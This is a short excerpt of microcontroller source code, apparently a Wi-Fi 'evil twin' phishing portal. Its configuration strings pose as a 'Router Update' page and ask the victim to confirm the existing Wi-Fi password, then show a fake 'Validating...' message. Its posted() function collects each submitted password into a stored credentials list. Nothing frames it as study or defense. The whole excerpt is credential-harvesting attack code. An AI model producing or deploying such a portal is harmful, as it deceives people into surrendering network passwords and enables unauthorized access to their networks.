...
// User configuration
#define SSID_NAME "Baka"
#define SUBTITLE "Router Update"
#define TITLE "Sign in:"
#define BODY "Confirm Your Existing Wifi Password"
#define POST_TITLE "Validating..."
#define POST_BODY "Your Router Password is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
...
String posted() {
  ...
  Credentials = "<li>Password: <b>" + password + "</b></li>" + Credentials;
